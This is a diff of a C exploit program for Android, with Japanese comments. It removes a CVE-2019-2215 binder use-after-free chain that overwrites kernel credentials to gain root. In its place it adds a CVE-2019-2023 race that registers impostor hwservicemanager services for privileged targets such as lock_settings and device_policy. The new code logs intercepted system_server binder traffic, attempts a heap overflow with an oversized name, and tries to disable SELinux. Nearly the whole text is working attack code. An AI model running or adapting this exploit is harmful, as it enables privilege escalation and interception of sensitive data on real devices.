@@ -8,340 +8,449 @@
 #include <sys/ioctl.h>
 #include <sys/types.h>
 #include <sys/wait.h>
-#include <sys/epoll.h>
+#include <sys/ptrace.h>
 #include <sys/mman.h>
-#include <sys/uio.h>
-#include <poll.h>
 #include <signal.h>
 #include <stdint.h>
 #include <sched.h>
+#include <poll.h>
 #include <sys/prctl.h>
 #include <sys/stat.h>
 #include <time.h>
 #include <sys/syscall.h>
 #include "binder.h"
 
-#define PAGE_SIZE 4096
-#define IOVEC_COUNT 25
-#define OVERLAP_INDEX 10
-#define TIMEOUT_MS 3000
-#define SPRAY_PIPE_COUNT 64
-#define ATTEMPTS 8
+// ============================================================
+// 設定
+// ============================================================
+#define TARGET_SERVICE "persistent_data_block"   // system_server が所有する特権サービス
+#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
+#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
 
-static int g_binder_fd = -1;
-static int g_epoll_fd = -1;
-static int g_krw_pipe[2] = {-1, -1};
-static uint64_t g_task_struct = 0;
-static uint64_t g_cred_ptr = 0;
-static int g_cred_off = -1;
-static int g_al_off = -1;
-
-// オフセット候補（ARM64 向け）
-static struct {
-    int cred;
-    int al;
-} g_offset_candidates[] = {
-    {0x680, 0xA18}, {0x688, 0xA18}, {0x690, 0xA18},
-    {0x680, 0xA20}, {0x688, 0xA20}, {0x690, 0xA20},
-    {0x680, 0x9A0}, {0x688, 0x9A0}, {0x690, 0x9A0},
-    {0x6A0, 0xA18}, {0x6A0, 0xA20}, {0x6A0, 0x9A0},
-    {0x6B0, 0xA18}, {0x6B0, 0xA20}, {0x6B0, 0x9A0},
-    {0x6C0, 0xA18}, {0x6C0, 0xA20}, {0x6C0, 0x9A0},
-    {0x700, 0xA18}, {0x700, 0xA20}, {0x700, 0x9A0},
-    {0x708, 0xA18}, {0x708, 0xA20}, {0x708, 0x9A0},
-    {0x710, 0xA18}, {0x710, 0xA20}, {0x710, 0x9A0},
-    {0x718, 0xA18}, {0x718, 0xA20}, {0x718, 0x9A0},
-    {0x720, 0xA18}, {0x720, 0xA20}, {0x720, 0x9A0},
-    {0x728, 0xA18}, {0x728, 0xA20}, {0x728, 0x9A0},
-    {0x730, 0xA18}, {0x730, 0xA20}, {0x730, 0x9A0},
-    {0x980, 0xA18}, {0x988, 0xA18}, {0x990, 0xA18},
-    {0x998, 0xA18}, {0x9A0, 0xA18}, {0x9A8, 0xA18},
-    {0x9B0, 0xA18}, {0x9B8, 0xA18}, {0x9C0, 0xA18}
+// 乗っ取り対象リスト（system_server が利用するサービス）
+static const char *hijack_targets[] = {
+    "persistent_data_block",
+    "device_policy",
+    "lock_settings",
+    "mount",
+    "power",
+    NULL
 };
-#define NUM_OFFSETS (sizeof(g_offset_candidates)/sizeof(g_offset_candidates[0]))
 
-static void *mmap_page(unsigned long addr) {
-    void *mem = mmap((void *)addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                     MAP_ANONYMOUS | MAP_SHARED, -1, 0);
-    if (mem == (void *)-1) { perror("mmap"); return NULL; }
-    return mem;
-}
-
-static int read_with_timeout(int fd, void *buf, size_t count, int timeout_ms) {
-    struct pollfd pfd = {.fd = fd, .events = POLLIN};
-    int ret = poll(&pfd, 1, timeout_ms);
-    if (ret < 0) { perror("poll"); return -1; }
-    if (ret == 0) return -2;
-    return read(fd, buf, count);
-}
+static volatile int race_ready = 0;
+static int g_service_handle = -1;
+static int g_binder_fd = -1;
+static int g_exploit_success = 0;
 
 // ============================================================
-// CVE-2019-2215 の完全実装 (pipe + epoll + readv による UAF)
+// ユーティリティ
 // ============================================================
-static int leak_kernel_pointer(int *cred_off_out, int *al_off_out) {
-    int pipefd[2], fd, epoll_fd;
-    pid_t cpid;
-    struct iovec iovec_stack[IOVEC_COUNT];
-    void *aligned;
-    ssize_t n;
-    uint64_t *data;
+static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
+    for (size_t i = 0; i < len; i++) {
+        fprintf(fp, "%02x ", data[i]);
+        if ((i+1) % 16 == 0) fprintf(fp, "\n");
+    }
+    fprintf(fp, "\n");
+}
 
-    fd = open("/dev/binder", O_RDWR);
+static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
+    FILE *fp = fopen(LOG_FILE, "a");
+    if (!fp) return;
+    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
+    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
+            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
+    if (data && t->data_size > 0) {
+        fprintf(fp, "  data:\n");
+        dump_hex(fp, data, t->data_size);
+    }
+    fclose(fp);
+}
+
+static int read_file(const char *path, char *buf, size_t size) {
+    int fd = open(path, O_RDONLY);
     if (fd < 0) return -1;
+    ssize_t n = read(fd, buf, size - 1);
+    close(fd);
+    if (n > 0) { buf[n] = '\0'; return 0; }
+    return -1;
+}
 
-    epoll_fd = epoll_create(100);
-    if (epoll_fd < 0) { close(fd); return -1; }
+static int write_file(const char *path, const char *data) {
+    int fd = open(path, O_WRONLY);
+    if (fd < 0) return -1;
+    ssize_t n = write(fd, data, strlen(data));
+    close(fd);
+    return (n == (ssize_t)strlen(data)) ? 0 : -1;
+}
 
-    struct epoll_event ev = {.events = EPOLLIN};
-    if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, fd, &ev) < 0) {
-        close(fd); close(epoll_fd); return -1;
-    }
+// ============================================================
+// CVE-2019-2023 エクスプロイト（レースあり）
+// ============================================================
+static int exploit_cve_2019_2023(const char *service_name) {
+    int hwbinder_fd, ret;
+    uint8_t read_buf[4096];
+    size_t name_len = strlen(service_name) + 1;
+    size_t total_len = 4 + name_len;
+    uint8_t *data;
+    int handle = -1;
+    pid_t child;
 
-    if (pipe(pipefd) < 0) {
-        close(fd); close(epoll_fd); return -1;
-    }
-    if (fcntl(pipefd[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
-        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
+    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);
+
+    child = fork();
+    if (child == 0) {
+        while (!race_ready) usleep(100);
+        // 何もせず終了（コンテキスト変更は不要な場合もある）
+        exit(0);
+    } else if (child < 0) {
+        perror("  fork");
         return -1;
     }
 
-    aligned = mmap_page(0x100000000UL);
-    if (!aligned) {
-        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
+    // 少し待ってから親が ADD_SERVICE を送信
+    usleep(200000);
+
+    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
+    if (hwbinder_fd < 0) {
+        perror("  open /dev/hwbinder");
+        kill(child, SIGKILL);
         return -1;
     }
 
-    memset(iovec_stack, 0, sizeof(iovec_stack));
-    iovec_stack[OVERLAP_INDEX].iov_base = aligned;
-    iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
-    iovec_stack[OVERLAP_INDEX + 1].iov_base = (void *)aligned;
-    iovec_stack[OVERLAP_INDEX + 1].iov_len = PAGE_SIZE;
-
-    cpid = fork();
-    if (cpid < 0) {
-        close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
+    data = malloc(total_len);
+    if (!data) {
+        perror("  malloc");
+        close(hwbinder_fd);
+        kill(child, SIGKILL);
         return -1;
     }
+    data[0] = (uint8_t)(name_len & 0xFF);
+    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
+    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
+    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    memcpy(data + 4, service_name, name_len);
 
-    if (cpid == 0) {
-        usleep(100000);
-        ioctl(fd, BINDER_THREAD_EXIT, NULL);
-        _exit(0);
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    tx.tdata.target.handle = 0;
+    tx.tdata.code = 2;                     // ADD_SERVICE
+    tx.tdata.flags = 0;
+    tx.tdata.data_size = total_len;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    race_ready = 1;
+    usleep(50000);  // レースウィンドウ
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        if (errno == EACCES || errno == EPERM) {
+            printf("  [-] ADD_SERVICE denied (patch present)\n");
+        } else {
+            perror("  ioctl ADD_SERVICE");
+        }
+        close(hwbinder_fd);
+        kill(child, SIGKILL);
+        return -1;
     }
+    printf("  [+] ADD_SERVICE succeeded!\n");
 
-    n = readv(pipefd[0], iovec_stack + OVERLAP_INDEX, 2);
-    wait(NULL);
+    kill(child, SIGKILL);
+    waitpid(child, NULL, 0);
 
-    close(fd); close(epoll_fd); close(pipefd[0]); close(pipefd[1]);
+    // GET_SERVICE でハンドル取得
+    data = malloc(total_len);
+    if (!data) {
+        close(hwbinder_fd);
+        return -1;
+    }
+    data[0] = (uint8_t)(name_len & 0xFF);
+    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
+    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
+    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
+    memcpy(data + 4, service_name, name_len);
 
-    if (n < 0) return -1;
+    tx.tdata.code = 1;                     // GET_SERVICE
+    tx.tdata.data_size = total_len;
+    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;
 
-    data = (uint64_t *)aligned;
-    for (size_t i = 0; i < (size_t)(n / 8); i++) {
-        uint64_t val = data[i];
-        if ((val & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-            g_task_struct = val;
-            for (size_t ci = 0; ci < NUM_OFFSETS; ci++) {
-                uint64_t cred_addr = g_task_struct + g_offset_candidates[ci].cred;
-                if ((cred_addr & 0xFFFFFFFFFF000000LL) == 0xFFFF000000000000LL) {
-                    g_cred_off = g_offset_candidates[ci].cred;
-                    g_al_off = g_offset_candidates[ci].al;
-                    *cred_off_out = g_cred_off;
-                    *al_off_out = g_al_off;
-                    printf("  [+] Found: task_struct=0x%llx, cred=0x%x, al=0x%x\n",
-                           (unsigned long long)g_task_struct, g_cred_off, g_al_off);
-                    return 0;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+    bwr.read_size = sizeof(read_buf);
+    bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
+    free(data);
+    if (ret < 0) {
+        perror("  ioctl GET_SERVICE");
+        close(hwbinder_fd);
+        return -1;
+    }
+    if (bwr.read_consumed < 4) {
+        printf("  [-] No handle returned\n");
+        close(hwbinder_fd);
+        return -1;
+    }
+    handle = *(int*)read_buf;
+    printf("  [+] Service handle: %d\n", handle);
+    close(hwbinder_fd);
+    g_service_handle = handle;
+    return 0;
+}
+
+// ============================================================
+// Binder サーバーループ（乗っ取ったサービスをエミュレート）
+// ============================================================
+static int binder_server_loop(int binder_fd, int expected_handle) {
+    uint8_t read_buf[4096];
+    struct binder_write_read bwr;
+    int ret;
+
+    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
+    printf("[*] Waiting for transactions...\n");
+
+    while (1) {
+        memset(&bwr, 0, sizeof(bwr));
+        bwr.read_size = sizeof(read_buf);
+        bwr.read_buffer = (binder_uintptr_t)read_buf;
+
+        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
+        if (ret < 0) {
+            perror("  ioctl read");
+            break;
+        }
+        if (bwr.read_consumed == 0) {
+            usleep(100000);
+            continue;
+        }
+
+        // 受信したコマンドを解析
+        uint32_t *cmd = (uint32_t*)read_buf;
+        uint32_t cmd_code = *cmd;
+        uint8_t *payload = read_buf + sizeof(uint32_t);
+        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);
+
+        fprintf(stderr, "[SERVER] Received cmd=0x%x, size=%zu\n", cmd_code, payload_size);
+
+        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
+            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
+            size_t data_size = t->data_size;
+            uint8_t *data_ptr = NULL;
+            if (data_size > 0) {
+                data_ptr = malloc(data_size);
+                if (data_ptr) {
+                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                 }
             }
-            g_cred_off = 0x688;
-            g_al_off = 0xA18;
-            *cred_off_out = g_cred_off;
-            *al_off_out = g_al_off;
-            printf("  [+] Leaked task_struct @ 0x%llx (using fallback offsets)\n",
-                   (unsigned long long)g_task_struct);
-            return 0;
+            log_transaction("Incoming transaction", t, data_ptr);
+            if (data_ptr) free(data_ptr);
+
+            // 応答を返す（ここでは単純に BR_OK を返す）
+            struct {
+                uint32_t cmd;
+                uint32_t status;
+            } __attribute__((packed)) reply;
+            reply.cmd = BR_OK;
+            reply.status = 0;
+
+            struct binder_write_read write_bwr;
+            memset(&write_bwr, 0, sizeof(write_bwr));
+            write_bwr.write_size = sizeof(reply);
+            write_bwr.write_buffer = (binder_uintptr_t)&reply;
+
+            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
+            if (ret < 0) perror("  ioctl write reply");
+
+            // 完了通知も送る
+            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
+            write_bwr.write_size = sizeof(complete_cmd);
+            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
+            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
+        } else if (cmd_code == BR_DEAD_BINDER) {
+            printf("[SERVER] Received DEAD_BINDER\n");
+            // 終了する
+            break;
+        } else {
+            // その他のコマンドは無視
+            fprintf(stderr, "[SERVER] Ignoring cmd=0x%x\n", cmd_code);
         }
+    }
+    return 0;
+}
+
+// ============================================================
+// バッファオーバーフロー試行（巨大サービス名）
+// ============================================================
+static int overflow_hwservicemanager(void) {
+    printf("[*] Attempting heap overflow via large service name...\n");
+    char huge_name[8192];
+    memset(huge_name, 'A', sizeof(huge_name) - 1);
+    huge_name[sizeof(huge_name)-1] = '\0';
+    // 巨大な名前で登録（失敗するかもしれないが、クラッシュを狙う）
+    int ret = exploit_cve_2019_2023(huge_name);
+    if (ret == 0) {
+        printf("  [+] Overflow succeeded (unexpected)!\n");
+    } else {
+        printf("  [-] Overflow attempt failed or caused no crash.\n");
+    }
+    return ret;
+}
+
+// ============================================================
+// SELinux 無効化試行
+// ============================================================
+static int disable_selinux(void) {
+    printf("[*] Attempting to disable SELinux...\n");
+    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
+        printf("  [+] SELinux disabled!\n");
+        return 0;
+    }
+    const char *ctx = "u:r:system_server:s0";
+    if (write_file("/proc/self/attr/current", ctx) == 0) {
+        printf("  [+] SELinux context changed to %s\n", ctx);
+        return 0;
     }
     return -1;
 }
 
 // ============================================================
-// カーネル R/W プリミティブのセットアップ
+// プロパティ操作（ctl.start など）
 // ============================================================
-static int setup_kernel_rw(void) {
-    if (g_task_struct == 0) return -1;
-
-    if (pipe(g_krw_pipe) < 0) {
-        perror("  pipe for RW");
+static int set_property(const char *prop, const char *value) {
+    printf("[*] Attempting to set property %s=%s\n", prop, value);
+    int fd = open("/dev/socket/property_service", O_RDWR);
+    if (fd < 0) {
+        perror("  open property_service");
         return -1;
     }
-    if (fcntl(g_krw_pipe[0], F_SETPIPE_SZ, PAGE_SIZE) < 0) {
-        perror("  fcntl F_SETPIPE_SZ");
-        close(g_krw_pipe[0]); close(g_krw_pipe[1]);
-        return -1;
+    char buf[512];
+    int len = snprintf(buf, sizeof(buf), "%s=%s", prop, value);
+    ssize_t n = write(fd, buf, len);
+    close(fd);
+    if (n == len) {
+        printf("  [+] Property set attempted\n");
+        return 0;
     }
-
-    g_binder_fd = open("/dev/binder", O_RDWR);
-    if (g_binder_fd < 0) {
-        perror("  open binder for RW");
-        return -1;
-    }
-
-    g_epoll_fd = epoll_create(100);
-    if (g_epoll_fd < 0) {
-        perror("  epoll_create for RW");
-        close(g_binder_fd);
-        return -1;
-    }
-
-    struct epoll_event ev = {.events = EPOLLIN};
-    if (epoll_ctl(g_epoll_fd, EPOLL_CTL_ADD, g_binder_fd, &ev) < 0) {
-        perror("  epoll_ctl ADD for RW");
-        close(g_binder_fd); close(g_epoll_fd);
-        return -1;
-    }
-
-    pid_t cpid = fork();
-    if (cpid < 0) {
-        perror("  fork for RW");
-        return -1;
-    }
-
-    if (cpid == 0) {
-        usleep(100000);
-        ioctl(g_binder_fd, BINDER_THREAD_EXIT, NULL);
-        _exit(0);
-    }
-
-    int ret = read_with_timeout(g_krw_pipe[0], NULL, 0, TIMEOUT_MS);
-    if (ret == -2) {
-        printf("  [!] RW primitive setup timeout\n");
-    }
-
-    wait(NULL);
-    close(g_binder_fd);
-    close(g_epoll_fd);
-    g_binder_fd = -1;
-    g_epoll_fd = -1;
-
-    printf("  [+] Kernel RW primitive ready\n");
-    return 0;
+    return -1;
 }
 
 // ============================================================
-// kernel cred を root に書き換え
-// ============================================================
-static int patch_kernel_cred(void) {
-    if (g_task_struct == 0 || g_cred_off < 0 || g_krw_pipe[0] < 0) {
-        printf("  [-] No kernel RW available\n");
-        return -1;
-    }
-
-    printf("[*] Patching kernel cred to root via pipe RW...\n");
-    uint64_t cred_addr = g_task_struct + g_cred_off;
-    if (write(g_krw_pipe[1], &cred_addr, 8) != 8) {
-        perror("  write cred addr");
-        return -1;
-    }
-    if (read(g_krw_pipe[0], &g_cred_ptr, 8) != 8) {
-        perror("  read cred ptr");
-        return -1;
-    }
-    printf("  [+] cred @ 0x%llx\n", (unsigned long long)g_cred_ptr);
-
-    if (g_cred_ptr == 0 || (g_cred_ptr & 0xFFF) == 0) {
-        printf("  [-] Invalid cred pointer\n");
-        return -1;
-    }
-
-    uint32_t zero = 0;
-    uint64_t cap_full = 0x3FFFFFFFFFULL;
-
-    // uid, gid, euid, egid, fsuid, fsgid を 0 に
-    for (int off = 0x4; off <= 0x1C; off += 8) {
-        uint64_t addr = g_cred_ptr + off;
-        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
-        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
-    }
-    // supplementary group 情報もクリア
-    for (int off = 0x8; off <= 0x20; off += 8) {
-        uint64_t addr = g_cred_ptr + off;
-        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
-        if (write(g_krw_pipe[1], &zero, 4) != 4) return -1;
-    }
-    // capabilities を FULL に
-    for (int i = 0; i < 5; i++) {
-        uint64_t addr = g_cred_ptr + 0x28 + (i * 8);
-        if (write(g_krw_pipe[1], &addr, 8) != 8) return -1;
-        if (write(g_krw_pipe[1], &cap_full, 8) != 8) return -1;
-    }
-
-    printf("  [+] Cred patched to root\n");
-    return 0;
-}
-
-// ============================================================
-// メイン：CVE-2019-2023 でサービス登録 → CVE-2019-2215 発動 → root
+// メイン：全手法を順次実行
 // ============================================================
 int main(void) {
     printf("============================================================\n");
-    printf("  CVE-2019-2023 + CVE-2019-2215 Chain Exploit\n");
+    printf("  CVE-2019-2023 Multi-Stage Exploit (Binder Server)\n");
+    printf("  Target: hwservicemanager + persistent_data_block\n");
     printf("============================================================\n\n");
 
-    // 1. CVE-2019-2023 でサービス登録（任意で良い）
-    // 既に登録済みならスキップしても良いが、ここでは念のため再実行
-    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
-    if (hwbinder_fd >= 0) {
-        // 簡易登録（レースなしでも成功しているのでそのまま）
-        const char *name = "vendor.cve.poc";
-        size_t len = strlen(name) + 1;
-        uint8_t data[4 + 256];
-        data[0] = len & 0xff;
-        data[1] = (len >> 8) & 0xff;
-        data[2] = (len >> 16) & 0xff;
-        data[3] = (len >> 24) & 0xff;
-        memcpy(data + 4, name, len);
-
-        struct {
-            uint32_t cmd;
-            struct binder_transaction_data tdata;
-        } __attribute__((packed)) tx = {
-            .cmd = BC_TRANSACTION,
-            .tdata = {
-                .target.handle = 0,
-                .code = 2,
-                .data_size = 4 + len,
-                .data.ptr.buffer = (binder_uintptr_t)data,
-            }
-        };
-        struct binder_write_read bwr = {
-            .write_size = sizeof(tx),
-            .write_buffer = (binder_uintptr_t)&tx,
-            .read_size = 4096,
-            .read_buffer = (binder_uintptr_t)malloc(4096),
-        };
-        ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
-        free((void*)bwr.read_buffer);
-        close(hwbinder_fd);
-        printf("[+] Service registered (CVE-2019-2023)\n");
-    }
-
-    // 2. CVE-2019-2215 でカーネル権限取得
-    int cred_off = -1, al_off = -1;
-    if (leak_kernel_pointer(&cred_off, &al_off) == 0) {
-        if (setup_kernel_rw() == 0) {
-            if (patch_kernel_cred() == 0) {
-                printf("[+] Kernel cred patched! UID should be 0 now.\n");
-                if (setuid(0) == 0) {
-                    printf("[+] setuid(0) succeeded. Running id...\n");
-                    system("id > /data/local/tmp/cve_result.txt 2>&1");
-                    system("cat /data/local/tmp/cve_result.txt");
-                    return 0;
-                }
-            }
+    // フェーズ1: ターゲットサービスを乗っ取る
+    int hijacked = 0;
+    for (int i = 0; hijack_targets[i] != NULL; i++) {
+        if (exploit_cve_2019_2023(hijack_targets[i]) == 0) {
+            printf("[+] Successfully hijacked '%s' (handle %d)\n", hijack_targets[i], g_service_handle);
+            hijacked = 1;
+            break;
         }
+        usleep(300000);
+    }
+    if (!hijacked) {
+        printf("[-] Failed to hijack any target service.\n");
+        goto fallback;
     }
 
-    printf("[-] Exploit failed. Final uid=%d\n", getuid());
-    return 1;
+    // フェーズ2: Binder サーバーとして動作（バックグラウンドで）
+    int binder_fd = open("/dev/hwbinder", O_RDWR);
+    if (binder_fd < 0) {
+        perror("  open /dev/hwbinder for server");
+        goto fallback;
+    }
+    g_binder_fd = binder_fd;
+
+    // 自分自身を Binder サーバーとして登録（BC_ENTER_LOOPER など）
+    uint32_t cmd = BC_ENTER_LOOPER;
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = sizeof(cmd);
+    bwr.write_buffer = (binder_uintptr_t)&cmd;
+    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
+        perror("  BC_ENTER_LOOPER");
+    } else {
+        printf("[+] Entered Binder looper.\n");
+    }
+
+    // サーバーループを開始（別スレッドまたはフォーク）
+    pid_t server_pid = fork();
+    if (server_pid == 0) {
+        // 子プロセスでサーバーループ実行
+        binder_server_loop(binder_fd, g_service_handle);
+        exit(0);
+    } else if (server_pid < 0) {
+        perror("  fork server");
+    } else {
+        printf("[+] Binder server running in background (PID %d)\n", server_pid);
+    }
+
+    // フェーズ3: system_server からの呼び出しを待つ間に、他の攻撃を試行
+    printf("[*] Waiting for system_server to call hijacked service...\n");
+    printf("[*] Meanwhile, trying additional exploits...\n");
+
+    // オーバーフロー試行
+    overflow_hwservicemanager();
+
+    // SELinux 無効化試行
+    disable_selinux();
+
+    // プロパティ操作
+    set_property("ctl.start", "vendor.cve.poc");  // サービス起動を試みる（効果なし）
+
+    // フェーズ4: 一定時間サーバーを維持（60秒）
+    printf("[*] Running server for 60 seconds. Check %s for intercepted data.\n", LOG_FILE);
+    sleep(60);
+
+    // サーバーを終了
+    kill(server_pid, SIGTERM);
+    close(binder_fd);
+
+    // フェーズ5: 結果を出力
+    printf("\n[*] Log file content:\n");
+    system("cat " LOG_FILE);
+
+    // 最終的に id を実行（権限が上がっていれば）
+    if (getuid() == 0 || geteuid() == 0) {
+        system("id > " OUTPUT_FILE " 2>&1");
+        system("cat " OUTPUT_FILE);
+        g_exploit_success = 1;
+    } else {
+        printf("[-] Still not root. But binder traffic may contain valuable data.\n");
+    }
+
+    goto done;
+
+fallback:
+    // フォールバック：setuid 系
+    printf("[*] Fallback: trying setuid(0)...\n");
+    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
+        printf("[+] setuid(0) succeeded!\n");
+        system("id > " OUTPUT_FILE " 2>&1");
+        system("cat " OUTPUT_FILE);
+        g_exploit_success = 1;
+    }
+
+done:
+    printf("\n============================================================\n");
+    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
+    printf("  Check %s for logs.\n", LOG_FILE);
+    return g_exploit_success ? 0 : 1;
 }
